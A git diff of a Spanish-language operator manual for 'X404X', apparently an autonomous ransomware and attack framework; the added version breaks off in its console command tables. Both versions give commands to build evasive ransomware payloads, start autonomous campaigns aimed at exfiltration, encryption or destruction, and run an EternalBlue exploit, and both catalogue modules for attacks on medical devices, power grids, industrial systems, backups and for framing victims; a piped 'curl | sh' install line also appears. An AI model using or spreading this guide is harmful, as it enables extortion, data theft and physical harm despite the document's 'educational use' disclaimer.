@@ -1,656 +1,1393 @@
-# X404X — Guía Operacional Completa
+# X404X — Manual Operacional Completo
 
-> Plataforma autónoma de Red Team con 154+ módulos, IA integrada (Specter/Apex), y orquestación POMDP.
-> Build: 26.6MB ELF x86-64 · Go 1.25 · Python 3.14
-
----
-
-## 1. Arranque Rápido
-
-### Iniciar el Dashboard (API + WebSocket + UI)
-
-```bash
-./x404x dashboard
-```
-
-Esto levanta:
-- API REST en `https://localhost:8443`
-- WebSocket en puerto `8446` (configurado en `config.yaml` → `server.ws_port`)
-- Frontend Vue3 en `http://localhost:3000` (si `dashboard.enabled: true`)
-- gRPC AgentService en puerto `8444`
-
-El servidor escucha en `0.0.0.0` por defecto. Para cambiar el puerto o habilitar TLS automático, editar `config.yaml`:
-
-```yaml
-server:
-  host: "0.0.0.0"
-  port: 8443
-  enable_tls: true
-  auto_cert: true
-
-dashboard:
-  enabled: true
-  port: 3000
-```
-
-### Iniciar la Consola Interactiva (msfconsole-style)
-
-```bash
-./x404x console
-```
-
-Abre un shell interactivo con autocompletado, historial, y acceso a todos los módulos. Prompt:
-
-```
-x404x > 
-```
-
-### Iniciar el Laboratorio Docker
-
-```bash
-make lab-up
-```
-
-Levanta 5 contenedores Docker con red aislada `172.20.0.0/24`:
-- `x404x-attacker` (172.20.0.10) — Nodo atacante con framework completo
-- `x404x-target1` — Objetivo Linux vulnerable
-- `x404x-target2` — Objetivo Windows (Wine)
-- `x404x-target3` — Servidor web vulnerable
-- `x404x-dashboard` — Dashboard en localhost:3000
+> Plataforma autónoma de Red Team · 45 módulos · 4 fases · ~12,700 líneas
+> Go + Python + WASM · Post-Quantum C2 · Kernel Evasion · Exotic Propagation
 
 ---
 
-## 2. Generar un Payload Ransomware
+## Índice
 
-### Comando Básico
-
-```bash
-x404x payload generate --os windows --arch amd64 --c2 10.0.0.1:8443 --evasion stealth
-```
-
-### Salida
-
-El binario compilado se genera en:
-
-```
-dist/agent-windows-amd64.exe
-```
-
-El payload incluye:
-- Comunicación cifrada con XChaCha20-Poly1305 + X25519 key exchange
-- Heartbeat configurable (default 30s)
-- Kill switch integrado (código: `EMERGENCY_STOP`)
-- Auto-destrucción tras 2 horas (`safety.auto_destruct_hours`)
-
-### Flag `--evasion`
-
-| Nivel | Técnicas Aplicadas |
-|-------|-------------------|
-| `none` | Sin ofuscación, binario limpio |
-| `basic` | XOR strings + strip symbols |
-| `stealth` | Polimorfismo + packer UPX + AMSI bypass + ETW patch |
-| `paranoid` | Todo lo anterior + sleep jitter + indirect syscalls + sandbox detection |
-
-El nivel `stealth` aplica:
-1. **Polimorfismo**: Cada build genera un hash único (mutación de código muerto)
-2. **Packer**: Compresión UPX con stub personalizado
-3. **AMSI Bypass**: Patchea AmsiScanBuffer en runtime
-4. **ETW Patch**: Deshabilita Event Tracing for Windows
-
-### Plataformas Soportadas
-
-| OS | Arquitecturas |
-|----|---------------|
-| windows | amd64, arm64 |
-| linux | amd64, arm64 |
-| darwin | amd64, arm64 |
+1. [Requisitos e Instalación](#1-requisitos-e-instalación)
+2. [Despliegue Rápido](#2-despliegue-rápido)
+3. [Arquitectura de Componentes](#3-arquitectura-de-componentes)
+4. [Consola Interactiva](#4-consola-interactiva)
+5. [Gestión de Campañas](#5-gestión-de-campañas)
+6. [Catálogo de Módulos](#6-catálogo-de-módulos)
+7. [Dashboard Operacional](#7-dashboard-operacional)
+8. [C2 — Command & Control](#8-c2---command--control)
+9. [Suite de Evasión](#9-suite-de-evasión)
+10. [Vectores de Propagación](#10-vectores-de-propagación)
+11. [Módulos de IA](#11-módulos-de-ia)
+12. [Laboratorio EDR](#12-laboratorio-edr)
+13. [Generación de Payloads](#13-generación-de-payloads)
+14. [Bridge Python](#14-bridge-python)
+15. [Solución de Problemas](#15-solución-de-problemas)
+16. [Referencia de Archivos](#16-referencia-de-archivos)
 
 ---
 
-## 3. Ejecutar una Campaña
+## 1. Requisitos e Instalación
 
-### Crear y Lanzar Campaña
-
-```bash
-x404x campaign start --name demo --target 10.0.0.0/24 --goal exfil_encrypt --profile aggressive --auto
-```
-
-| Flag | Descripción |
-|------|-------------|
-| `--name` | Identificador de la campaña |
-| `--target` | Rango IP objetivo (CIDR) |
-| `--goal` | Objetivo final: `domain_admin`, `exfil_encrypt`, `persistence`, `destruction` |
-| `--profile` | Perfil de velocidad: `stealth`, `balanced`, `aggressive` |
-| `--auto` | Modo autónomo — la IA toma decisiones sin intervención |
-
-### Fases del Kill Chain
-
-La campaña recorre automáticamente 7 fases:
-
-#### Fase 1: Reconocimiento (Recon)
-- Escaneo TCP/UDP del rango objetivo
-- OSINT pasivo (DNS, subdominios, certificados)
-- Fingerprinting de servicios y versiones
-- Detección de vulnerabilidades conocidas
-
-#### Fase 2: Armamento (Weaponization)
-- Selección automática de exploits según vulnerabilidades detectadas
-- Generación de payload adaptado al SO/arquitectura del target
-- Aplicación del nivel de evasión configurado en el perfil
-
-#### Fase 3: Entrega (Delivery)
-- Vector seleccionado por la IA: phishing, exploit directo, supply chain
-- Si el perfil es `aggressive`: entrega directa por red
-- Si el perfil es `stealth`: phishing con LLM o supply chain
-
-#### Fase 4: Explotación (Exploitation)
-- Ejecución del exploit seleccionado
-- Escalación de privilegios automática (SUID, sudo, kernel)
-- Bypass de defensas (AMSI, ETW, EDR)
-
-#### Fase 5: Instalación (Installation)
-- Persistencia según SO: cron, systemd, registry, bootkit
-- Despliegue del agente en el host comprometido
-- Registro con el C2 server
-
-#### Fase 6: Comando y Control (C2)
-- Agente establece canal cifrado con el servidor
-- Heartbeat periódico con jitter aleatorio
-- Canales disponibles: TCP, HTTP/S, DNS, ICMP, SMB, WebSocket, DoH
-
-#### Fase 7: Acciones sobre el Objetivo (Actions on Objective)
-- Según `--goal`:
-  - `exfil_encrypt`: Exfiltración de datos sensibles → Cifrado de archivos → Nota de rescate
-  - `domain_admin`: Movimiento lateral → Kerberoast → Golden Ticket
-  - `persistence`: Implantes múltiples + backup C2
-  - `destruction`: Wipe de discos + firmware corruption
-
-### Verificar Estado
+### 1.1 Dependencias
 
 ```bash
-x404x campaign status
-```
-
-Salida ejemplo:
-
-```
-Campaign: demo
-Status:   ACTIVE (Phase 4/7 — Exploitation)
-Target:   10.0.0.0/24
-Hosts:    24 discovered, 8 compromised, 3 active agents
-Goal:     exfil_encrypt (42% complete)
-Profile:  aggressive
-Duration: 00:14:32
-```
-
-### Otros Comandos de Campaña
-
-```bash
-x404x campaign list                    # Listar todas las campañas
-x404x campaign pause <campaign_id>     # Pausar campaña activa
-x404x campaign resume <campaign_id>    # Reanudar campaña pausada
-```
-
----
-
-## 4. Usar la Consola (msfconsole-style)
-
-### Iniciar
-
-```bash
-./x404x console
-```
-
-### Flujo de Trabajo Típico
-
-```
-x404x > use exploit/eternalblue
-[*] Module: exploit/eternalblue (MS17-010 EternalBlue SMB RCE)
-
-x404x (exploit/eternalblue) > set RHOSTS 10.0.0.10
-RHOSTS => 10.0.0.10
-
-x404x (exploit/eternalblue) > set PAYLOAD windows/meterpreter/reverse_tcp
-PAYLOAD => windows/meterpreter/reverse_tcp
-
-x404x (exploit/eternalblue) > exploit
-[*] Sending exploit to 10.0.0.10:445...
-[+] Shell opened — session 1
-
-x404x (exploit/eternalblue) > sessions
-  ID  Type       Target        Status    Duration
-  1   shell      10.0.0.10     active    00:02:14
-  2   meterp     10.0.0.15     active    00:08:42
-
-x404x (exploit/eternalblue) > sessions -i 1
-[*] Interacting with session 1...
-
-session 1 (10.0.0.10) > whoami
-nt authority\system
-```
-
-### Comandos de Consola
-
-| Comando | Descripción |
-|---------|-------------|
-| `use <module>` | Cargar un módulo |
-| `set <var> <value>` | Configurar variable del módulo |
-| `exploit` / `run` | Ejecutar módulo cargado |
-| `sessions` | Listar sesiones activas |
-| `sessions -i <id>` | Interactuar con sesión |
-| `search <term>` | Buscar módulos por nombre/descripción |
-| `info` | Información detallada del módulo cargado |
-| `options` | Mostrar opciones configurables |
-| `back` | Salir del módulo actual |
-| `help` | Mostrar ayuda |
-| `exit` | Salir de la consola |
-
-### Buscar Módulos
-
-```
-x404x > search ransomware
-  #   Module                          Description
-  1   ransomware/hope_trap            Partial decrypt trap + forensic monitor
-  2   ransomware/identity_destroy     Browser session theft + account hijack
-  3   ransomware/worm                 Multi-platform worm Win/Linux/macOS/IoT
-  4   ransomware/supply_chain         Updater + NuGet/pip/npm/git poisoning
-  5   ransomware/cloud_exploit        AWS/Azure/GCP creds + instances
-  ...
-```
-
----
-
-## 5. Dashboard Web
-
-Acceder en `http://localhost:3000` (o el puerto configurado en `dashboard.port`).
-
-### Pestañas
-
-| Pestaña | Función |
-|---------|---------|
-| **Dashboard** | Visualización del Kill Chain en tiempo real. Muestra la fase actual, progreso de la campaña, y un feed en vivo de eventos (agentes conectados, exploits lanzados, archivos cifrados). Diagrama interactivo de Lockheed Martin Cyber Kill Chain. |
-| **Agents** | Flota de agentes desplegados. Tabla con ID, hostname, SO, IP, último heartbeat, estado (online/dead/dormant). Permite interactuar, enviar tareas, o eliminar agentes. |
-| **Recon** | Mapa de red generado tras el escaneo. Nodos representan hosts, colores indican estado (vulnerable/comprometido/limpio). Topología de red con puertos abiertos y servicios. |
-| **AI** | Chat con Specter (LLM integrado vía Ollama). Permite hacer preguntas sobre la campaña, pedir sugerencias tácticas, o activar modo autónomo. Modelo configurable en `config.yaml` → `ai.model`. |
-| **Terminal** | CLI embebida en el navegador. Equivalente a `./x404x console` pero accesible desde la interfaz web. Soporta todos los comandos. |
-| **Metrics** | Panel de detección BlueForge. Muestra qué acciones fueron detectadas por el módulo de defensa simulada, score de evasión, y recomendaciones para reducir la huella. Reportes en `reports/blue_metrics.json`. |
-
----
-
-## 6. Módulos Disponibles
-
-### Categorías Principales
-
-#### Ransomware (v2.4 — 16 módulos)
-| Módulo | Función |
-|--------|---------|
-| `ransomware/hope_trap` | Trampa de descifrado parcial con monitor forense |
-| `ransomware/identity_destroy` | Robo de sesiones de navegador + hijack de cuentas |
-| `ransomware/worm` | Gusano multiplataforma Win/Linux/macOS/IoT |
-| `ransomware/supply_chain` | Envenenamiento de updaters + paquetes (NuGet/pip/npm/git) |
-| `ransomware/cloud_exploit` | Explotación de credenciales AWS/Azure/GCP |
-| `ransomware/bluetooth_prop` | Propagación por BlueBorne/BLE/WiFi Direct |
-| `ransomware/iot_botnet` | Botnet IoT con DDoS |
-| `ransomware/scada_attack` | Ataques Modbus/S7/CIP a PLCs |
-| `ransomware/hardware_kill` | Sobrevoltaje/kill de ventiladores/corrupción BIOS |
-| `ransomware/network_poison` | ARP spoof + MITM + portal cautivo |
-| `ransomware/dna_mutation` | Hibridación genética de DLLs |
-| `ransomware/bootkit` | Persistencia MBR/GPT |
-| `ransomware/blockchain_c2` | C2 via Bitcoin OP_RETURN |
-| `ransomware/fake_decryptor` | Descifrador falso que destruye claves |
-| `ransomware/raas_inverse` | Panel RaaS inverso multi-atacante |
-| `ransomware/survivor_game` | Competencia entre empleados |
-
-#### v2.6: POMDPs + IA + Evasión + Cloud (15 módulos)
-| Módulo | Función |
-|--------|---------|
-| `v26/pomdp` | Orquestador POMDPs + God of Chaos |
-| `v26/ai_negotiation` | Negociación IA con plantillas LLM |
-| `v26/evasion_deep` | Syscalls indirectas + AMSI/ETW + Hardware Breakpoints |
-| `v26/bootkit_smm` | UEFI + SMM bootkit |
-| `v26/mobile_x` | Agentes Android/iOS + hijack MDM |
-| `v26/cloud_nemesis` | AWS privesc + Lambda C2 serverless |
-| `v26/social_c2` | C2 via Twitter/Reddit + túnel DoH |
-| `omega/backup_parasite` | Infectar backups ZIP/VHD/VMDK |
-| `omega/integrity_attack` | Corrupción de checksums Tripwire/AIDE |
-| `omega/av_whitelist` | Inyección de exclusiones AV |
-| `omega/multi_generational` | Trampa de rescate aniversario 3 años |
-| `omega/hvac_attack` | Sobrecalentamiento de salas via Modbus |
-| `omega/amt_implant` | Backdoor firmware Intel AMT/AMD PSP |
-| `omega/satcom_hijack` | Flash firmware SATCOM + redirección |
-
-#### v2.7: Control Total + Phishing (10 módulos)
-| Módulo | Función |
-|--------|---------|
-| `v27/uefi_bootkit` | SPI flash DXE driver + NVRAM |
-| `v27/hypervisor_ring1` | Ring -1 Blue Pill/Vitriol |
-| `v27/pcie_rootkit` | GPU VRAM + NIC firmware DMA |
-| `v27/kernel_instrument` | eBPF syscall + ETW + BYOVD |
-| `v27/secure_boot_bypass` | Shim + MOK + GRUB compromise |
-| `v27/phishing_infra` | DGA + Caddy + CF Workers + SOCKS5 |
-| `v27/spear_phish_ai` | Ollama LLM + fake M365/Google |
-| `v27/anti_phish_evasion` | Tokens + Safe Links bypass |
-| `v27/smishing_sms` | Twilio/Vonage + SS7 2FA |
-| `v27/vishing_voice` | Clonación de voz + llamadas Twilio |
-
-#### v2.8: Arsenal de Malicia Ultimate (24 módulos)
-| Módulo | Función |
-|--------|---------|
-| `v28/iot_identity_theft` | Robo de certificados X.509 IoT |
-| `v28/false_memory` | Forjar evidencia en Teams/Slack/email |
-| `v28/thousand_cuts` | Degradación de servicios en 90 días |
-| `v28/patchguard_bypass` | KeBugCheckEx hook + DKOM |
-| `v28/keyboard_led` | Exfiltración Morse por LEDs (air-gap) |
-| `v28/zombie_army` | Campaña de difamación en redes sociales |
-| `v28/legacy_poison` | Inculpar a la víctima de actividades ilegales |
-| `v28/seo_sabotage` | Sabotaje SEO black-hat |
-| `v28/fake_vulns` | Vulnerabilidades trampa en repos |
-| `v28/inception_hv` | Hypervisor anidado matrioska |
-| `v28/isp_bgp` | Hijack BGP a escala Internet |
-| `v28/anti_attribution` | Clonación de identidad para incriminar |
-| `v28/power_grid_harmonics` | Destrucción resonante de transformadores |
-| `v28/time_lock` | Ventana de 30 min o destrucción de claves |
-| `v28/vr_spyware` | Spyware VR + mensajes subliminales |
-| `v28/global_ai_poison` | Backdoor en HuggingFace/Kaggle/OpenML |
-| `v28/cdn_injection` | Hijack Cloudflare/Akamai/Fastly |
-| `v28/bio_cyber_dna` | Alteración de órdenes de ADN sintético |
-| `v28/browser_parasite` | Extensión de navegador parásita oculta |
-| `v28/fake_documents` | Falsificación de órdenes de compra/resoluciones |
-| `v28/sound_panic` | Alarma de incendio/evacuación por altavoces IP |
-| `v28/emotional_encrypt` | Cifrado de archivos sentimentales |
-| `v28/false_redemption` | Descifrador falso + backdoor permanente |
-
-#### v2.9: Destrucción Hardware + Stealth (27 módulos)
-| Módulo | Función |
-|--------|---------|
-| `v29/hdd_firmware_destroy` | Corrupción firmware HDD + brick |
-| `v29/vrm_overvoltage` | Sobrevoltaje VRM CPU/GPU |
-| `v29/acoustic_resonance` | Resonancia acústica platos HDD |
-| `v29/psu_corrupt` | Sobrecarga firmware PSU |
-| `v29/usb_killer` | Descarga eléctrica USB |
-| `v29/robot_sabotage` | Inyección de comandos a robots industriales |
-| `v29/centrifuge_resonance` | Resonancia de centrífugas (clase Stuxnet) |
-| `v29/ui_shell_fake` | Overlay de shell OS falso |
-| `v29/deepfake_hallucinate` | Inyección de alucinaciones en LLMs |
-| `v29/network_ghosts` | Hosts fantasma en segmentos de red |
-| `v29/medical_tamper` | Manipulación de calibración médica |
-| `v29/intel_me_flash` | Backdoor firmware Intel ME |
-| `v29/smm_handler` | Implante handler SMM |
-| `v29/microcode_corrupt` | Corrupción de microcode CPU |
-| `v29/nic_persist` | Persistencia en firmware NIC |
-| `v29/mft_bitmap` | Corrupción bitmap MFT NTFS |
-| `v29/backup_prune` | Poda silenciosa de rotación de backups |
-| `v29/journal_poison` | Envenenamiento de journal filesystem |
-| `v29/dns_poison` | Envenenamiento cache DNS recursivo |
-| `v29/bgp_phantom` | Inyección rutas fantasma BGP |
-| `v29/ldap_intermittent` | Fallos intermitentes auth LDAP |
-| `v29/digital_thermite` | Destrucción de datos multicapa |
-| `v29/honey_token` | Despliegue + tracking de honey tokens |
-| `v29/access_log_wipe` | Sanitización selectiva de logs |
-| `v29/tpm_unseal` | Unseal TPM + extracción de claves |
-| `v29/dram_rowhammer` | Privesc via bit-flip DRAM Rowhammer |
-| `v29/supply_chain_hw` | Interdicción supply chain hardware |
-
-#### v2.10: Endgame (2 módulos)
-| Módulo | Función |
-|--------|---------|
-| `v210/apocalipsis` | Secuencia de aniquilación total de infraestructura |
-| `v210/phantom_evasion` | Eliminación total de huellas forenses |
-
-#### Block Z: El Umbral de la Perdición (14 módulos)
-| Módulo | Función |
-|--------|---------|
-| `blockz/genetic_evolve` | Breeding darwiniano de malware |
-| `blockz/deepfake` | Suplantación CEO con ONNX face+voice |
-| `blockz/scada_covert` | Sabotaje gradual de parámetros |
-| `blockz/firmware_worm` | Gusano firmware router/switch/firewall |
-| `blockz/medical_attack` | CVEs pacemaker/insulina/neuroestimulador |
-| `blockz/model_poison` | Backdoor poisoning de modelos IA |
-| `blockz/disinformation` | Sabotaje Email/Slack/calendar |
-| `blockz/airgap_jump` | Exfiltración ultrasonido + LED óptico |
-| `blockz/post_quantum` | Kyber-1024 + AES-256-GCM |
-| `blockz/deadman` | Apocalipsis autónomo 48h |
-| `blockz/falseflag` | Framing APT Lazarus/APT29/APT41 |
-| `blockz/edr_kill` | Silenciar 10 EDRs + auto-despliegue |
-| `blockz/financial` | Cosecha insider + opciones put |
-| `blockz/iot_chain` | Cascada hospital/fábrica/red eléctrica |
-
----
-
-## 7. Modo Laboratorio
-
-### Arquitectura del Lab
-
-El laboratorio Docker proporciona un entorno aislado para pruebas sin riesgo.
-
-### Iniciar
-
-```bash
-make lab-up
-```
-
-Salida:
-
-```
-[*] Starting Docker lab...
-[+] Lab running at:
-    Attacker:  docker exec -it x404x-attacker bash
-    Target 1:  docker exec -it x404x-target1 bash
-    Dashboard: http://localhost:3000
-```
-
-### Contenedores
-
-| Contenedor | IP | Descripción |
-|------------|-----|-------------|
-| `x404x-attacker` | 172.20.0.10 | Nodo atacante con framework completo |
-| `x404x-target1` | 172.20.0.20 | Linux vulnerable (SSH, Apache, Redis) |
-| `x404x-target2` | 172.20.0.21 | Windows simulado (Samba, SMB) |
-| `x404x-target3` | 172.20.0.22 | Web app vulnerable (Log4j, path traversal) |
-| `x404x-dashboard` | 172.20.0.100 | Dashboard Vue3 |
-
-### Entrar al Atacante
-
-```bash
-docker exec -it x404x-attacker bash
-```
-
-Dentro del contenedor, el framework está disponible:
-
-```bash
-./x404x console
-./x404x campaign start --name lab-test --target 172.20.0.0/24 --goal domain_admin --profile aggressive --auto
-```
-
-### Dashboard del Lab
-
-Accesible en `http://localhost:3000`. La autenticación está deshabilitada en modo lab (`dashboard.auth_token: ""`).
-
-### Detener
-
-```bash
-make lab-down
-```
-
-### Escenarios Disponibles
-
-```bash
-x404x lab up --scenario ctf_basic        # CTF básico con 5 targets
-x404x lab up --scenario ad_environment   # Simulación Active Directory
-x404x lab up --scenario webapp_pentest   # Testing de aplicaciones web
-x404x lab up --scenario full_chain       # Ejercicio kill chain completo
-```
-
----
-
-## 8. Webhooks y Notificaciones
-
-### Configuración
-
-Editar la sección `notifications` en `config.yaml`:
-
-```yaml
-notifications:
-  enabled: true
-  slack_webhook: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
-  discord_webhook: "https://discord.com/api/webhooks/YOUR/WEBHOOK/URL"
-  telegram_bot_token: "YOUR_BOT_TOKEN"
-  telegram_chat_id: "YOUR_CHAT_ID"
-  events: ["campaign_started", "campaign_completed", "agent_detected", "blue_team_alert"]
-```
-
-### Eventos Disponibles
-
-| Evento | Descripción |
-|--------|-------------|
-| `campaign_started` | Se inicia una nueva campaña |
-| `campaign_completed` | Campaña finaliza (éxito o fallo) |
-| `agent_detected` | Un agente fue detectado por defensas |
-| `agent_connected` | Nuevo agente se registra en C2 |
-| `blue_team_alert` | El módulo BlueForge detecta actividad |
-| `exploit_success` | Un exploit se ejecuta exitosamente |
-| `phase_transition` | La campaña avanza de fase |
-
-### Slack
-
-1. Crear un Incoming Webhook en la app de Slack
-2. Copiar la URL del webhook en `slack_webhook`
-3. Las notificaciones llegan como mensajes con formato rich (campos de campaña, target, fase)
-
-### Discord
-
-1. En el canal deseado → Ajustes → Integraciones → Webhooks → Nuevo Webhook
-2. Copiar la URL en `discord_webhook`
-3. Formato embed con colores según severidad
-
-### Telegram
-
-1. Crear bot con @BotFather → obtener token
-2. Obtener `chat_id` del grupo/canal
-3. Los mensajes incluyen markdown con detalles del evento
-
----
-
-## 9. Solución de Problemas
-
-### Dashboard devuelve 404
-
-**Causa**: La API Go no está corriendo en el puerto 8443.
-
-**Solución**:
-```bash
-# Verificar que el proceso está activo
-ps aux | grep x404x
-
-# Verificar puertos en uso
-ss -tlnp | grep 8443
-
-# Reiniciar
-./x404x dashboard
-```
-
-Asegurarse que `server.port: 8443` en `config.yaml` coincide con el puerto esperado.
-
-### Python Bridge no conecta
-
-**Causa**: El servicio Python (módulos en `modules/`) no escucha en el puerto 9100.
-
-**Solución**:
-```bash
-# Verificar dependencias Python
+# Core
+go >= 1.22.0          # Motor principal en Go
+python >= 3.11        # Bridge + handlers en Python
+git
+
+# Python packages
 pip install -r requirements.txt
 
-# Verificar que el puerto 9100 no está ocupado
-ss -tlnp | grep 9100
-
-# Reiniciar manualmente
-python modules/bridge.py --port 9100
+# Go modules
+cd internal/ransomware && go mod tidy && cd ../..
 ```
 
-### Payload no compila
+```yaml
+# Resumen de dependencias
+core:
+  go: ">=1.22"
+  python: ">=3.11"
+  
+python_packages:
+  - cryptography>=41.0
+  - numpy>=1.24
+  - requests>=2.31
+  - PyYAML>=6.0
+  - scapy>=2.5.0
+  - websocket-client>=1.6.0
+  - rich>=13.0
+  - click>=8.0
+  - fpdf2>=2.7.0
+  - python-docx>=1.1.0
+  - qrcode>=7.4
+  - Pillow>=10.0
+  - pymodbus>=3.5.0
 
-**Causa**: Versión de Go insuficiente.
+go_modules:
+  - google.golang.org/grpc
+  - google.golang.org/protobuf
+  - golang.org/x/crypto
+  - golang.org/x/sys
+  - golang.org/x/net
+  - modernc.org/sqlite
 
-**Solución**:
+optional:
+  docker: ">=27.0"    # Laboratorio EDR
+  node: ">=22.0"      # Dashboard frontend
+  tinygo: "latest"    # WASM compilation
+```
+
+### 1.2 Verificación de Instalación
+
 ```bash
-# Verificar versión de Go (requiere 1.22+)
+# Verificar Go
 go version
 
-# Si la versión es inferior, actualizar
-# Para Ubuntu/Debian:
-sudo rm -rf /usr/local/go
-wget https://go.dev/dl/go1.25.0.linux-amd64.tar.gz
-sudo tar -C /usr/local -xzf go1.25.0.linux-amd64.tar.gz
-```
+# Verificar Python
+python3 --version
+python3 -c "import cryptography; print('cryptography OK')"
 
-### Agente no conecta al C2
-
-**Causa**: Mismatch entre la dirección C2 del payload y el servidor.
-
-**Solución**:
-```bash
-# Verificar config del servidor
-grep -A2 "server:" config.yaml
-
-# El flag --c2 al generar el payload debe coincidir con server.host:server.port
-x404x payload generate --os linux --arch amd64 --c2 <TU_IP>:8443
-```
-
-### Base de datos bloqueada
-
-**Causa**: SQLite no soporta escrituras concurrentes.
-
-**Solución**:
-```bash
-# Verificar estado de la DB
-x404x db status
-
-# Si está corrupta, restaurar desde backup
-x404x db restore backups/x404x.db.bak
-
-# O migrar de nuevo
-x404x db migrate --up
-```
-
-### Lab Docker no inicia
-
-**Causa**: Docker no instalado o docker-compose no disponible.
-
-**Solución**:
-```bash
-# Verificar Docker
-docker --version
-docker compose version
-
-# Si no está disponible, instalar
-curl -fsSL https://get.docker.com | sh
-sudo usermod -aG docker $USER
-```
-
-### Ollama/IA no responde
-
-**Causa**: Servicio Ollama no corriendo o modelo no descargado.
-
-**Solución**:
-```bash
-# Verificar que Ollama está corriendo
-curl http://localhost:11434/api/tags
-
-# Descargar el modelo configurado
-ollama pull llama3.2
-
-# Verificar config
-grep -A4 "ai:" config.yaml
+# Verificar dependencias opcionales
+docker --version 2>/dev/null || echo "Docker no instalado (opcional)"
+tinygo version 2>/dev/null || echo "TinyGo no instalado (opcional)"
 ```
 
 ---
 
-## Notas de Seguridad
+## 2. Despliegue Rápido
 
-- **Kill Switch**: Siempre activo por defecto. Enviar `EMERGENCY_STOP` detiene todos los agentes.
-- **Geofence**: Activado por defecto. Los agentes verifican ubicación antes de actuar.
-- **Max Infections**: Límite de 1000 hosts por defecto (`safety.max_infections`).
-- **Auto-destrucción**: Los agentes se eliminan tras 2 horas sin contacto con C2.
-- **No Persistence**: Activado por defecto en modo seguro — los agentes no persisten tras reboot.
+### 2.1 One-Click Deploy
 
-Este framework es exclusivamente para uso educativo y pruebas de penetración autorizadas.
+```bash
+# Despliegue completo en Linux/macOS
+bash deploy/deploy.sh
+
+# El script ejecuta:
+#  1. Verifica dependencias (Go + Python3)
+#  2. Opcionalmente compila el payload ransomware
+#  3. Inicia el bridge Python en puerto 9100
+#  4. Inicia el servidor C2 (Pulse-C2)
+#  5. Inicia el dashboard (API + Web)
+#  6. Muestra resumen de servicios
+
+# Flags disponibles:
+bash deploy/deploy.sh --dev              # Modo desarrollo (hot-reload)
+bash deploy/deploy.sh --build-ransomware # Compilar payload
+bash deploy/deploy.sh --c2 10.0.0.1     # Especificar IP del C2
+bash deploy/deploy.sh --target-os linux  # SO objetivo del payload
+```
+
+### 2.2 Despliegue Manual
+
+```bash
+# Paso 1: Clonar y preparar
+git clone https://github.com/Ruby570bocadito/X404X.git
+cd X404X
+pip install -r requirements.txt
+cd internal/ransomware && go mod tidy && cd ../..
+
+# Paso 2: Iniciar el Bridge Python
+cd modules/bridge
+python3 bridge.py &
+cd ../..
+# Verificar: curl http://localhost:9100/health
+
+# Paso 3: Compilar y lanzar el C2 Dashboard
+cd plugins/pulse-c2/src/go
+go build -o x404x-dashboard ./cmd/dashboard
+./x404x-dashboard -port 9090 &
+cd ../../../..
+# Abrir: http://localhost:9090
+
+# Paso 4: Consola interactiva
+cd cmd/x404x
+go run . console
+```
+
+### 2.3 Demo Dry-Run
+
+```bash
+# Demo completa sin acciones reales
+bash scripts/run_demo.sh
+
+# El demo ejecuta:
+#  1. Verifica dependencias
+#  2. Inicia bridge Python en modo simulación
+#  3. Ejecuta escaneo de red (simulado)
+#  4. Lanza worm en modo dry-run
+#  5. Genera informe de misión
+```
+
+### 2.4 Worm en Modo Simulación
+
+```bash
+cd plugins/worm
+
+# Windows
+python worm_core.py --config configs/config_simulation.yaml
+
+# Linux/macOS  
+python3 worm_core.py --config configs/config_simulation.yaml
+
+# Configuración de simulación:
+#  - dry_run: true (sin exploits reales)
+#  - max_infections: 1000
+#  - max_runtime_hours: 4
+#  - kill_switch: EMERGENCY_STOP_SIMULATION
+```
+
+---
+
+## 3. Arquitectura de Componentes
+
+### 3.1 Diagrama de Flujo
+
+```
+Operador → [Consola CLI / Dashboard Web]
+                │
+        ┌───────┴───────┐
+        ▼               ▼
+   [C2 Hardened]   [AI Orchestrator]
+   SPIFFE mTLS     Q-Learning FSM
+   Ed25519 Sign    Federated Learning
+   Kyber KEM       Autofactory AFL++
+        │               │
+        └───────┬───────┘
+                ▼
+        [Core Engine Go]
+   ┌────────┼────────┐
+   ▼        ▼        ▼
+Ransomware Evasion  Propagation
+Engine    Suite     Vectors
+   │        │        │
+   └────────┼────────┘
+            ▼
+    [Python Bridge RPC]
+            │
+   ┌────────┼────────┐
+   ▼        ▼        ▼
+Worm+RL   Argos    Bluesky
+Plugin    Ops      BT
+```
+
+### 3.2 Componentes
+
+| Componente | Ruta | Lenguaje | Descripción |
+|------------|------|----------|-------------|
+| **Core Engine** | `internal/ransomware/` | Go | Motor de ransomware, evasión, propagación |
+| **AI Orchestrator** | `internal/appstate/` | Go | FSM con Q-learning |
+| **Dispatcher** | `internal/dispatch/` | Go | Mapeo MITRE ATT&CK |
+| **Agent** | `internal/agent/` | Go | Post-explotación, privesc |
+| **Bridge** | `modules/bridge/` | Python | RPC Go↔Python, ~170 handlers |
+| **Pulse C2** | `plugins/pulse-c2/` | Go | C2 con crypto SPIFFE/Ed25519/Kyber |
+| **Worm** | `plugins/worm/` | Python | Worm con RL, 35 exploits |
+| **Argos** | `plugins/operations/` | Go | Agentes cell/stager, EventBus |
+| **Bluesky** | `plugins/blue/` | Python | Ataques Bluetooth |
+| **AI Plugins** | `plugins/ai/` | Go | Hivemind, Autofactory, Vishing |
+| **RF Contagion** | `plugins/rf_contagion/` | Go | SDR 4G/5G, baseband |
+| **Wazero Bridge** | `internal/bridge/` | Go | WASM execution |
+| **Dashboard** | `plugins/pulse-c2/.../c2/` | Go+Vue | API HTTP/WS + UI |
+
+---
+
+## 4. Consola Interactiva
+
+### 4.1 Inicio
+
+```bash
+cd cmd/x404x
+go run . console
+
+# Prompt:
+# x404x >
+```
+
+### 4.2 Comandos de Navegación
+
+| Comando | Acción |
+|---------|--------|
+| `help` | Lista todos los comandos disponibles |
+| `banner` | Muestra el banner ASCII X404X |
+| `exit` / `quit` | Sale de la consola |
+| `version` | Muestra versión del framework |
+| `clear` | Limpia la pantalla |
+
+### 4.3 Comandos de Módulos
+
+| Comando | Acción |
+|---------|--------|
+| `modules` | Lista los 45 módulos disponibles |
+| `search <término>` | Busca módulos por nombre o descripción |
+| `use <módulo>` | Carga un módulo para configuración |
+| `show options` | Muestra parámetros del módulo cargado |
+| `set <param> <valor>` | Configura un parámetro |
+| `unset <param>` | Elimina un parámetro |
+| `run` / `exploit` | Ejecuta el módulo cargado |
+| `back` | Vuelve al menú principal |
+| `info <módulo>` | Muestra información detallada |
+
+### 4.4 Comandos de Campaña
+
+| Comando | Acción |
+|---------|--------|
+| `campaign start --name <nombre>` | Inicia nueva campaña |
+| `campaign status` | Estado de la campaña activa |
+| `campaign pause` | Pausa campaña |
+| `campaign resume` | Reanuda campaña |
+| `campaign stop` | Detiene campaña |
+| `killchain` | Muestra progreso del kill chain |
+
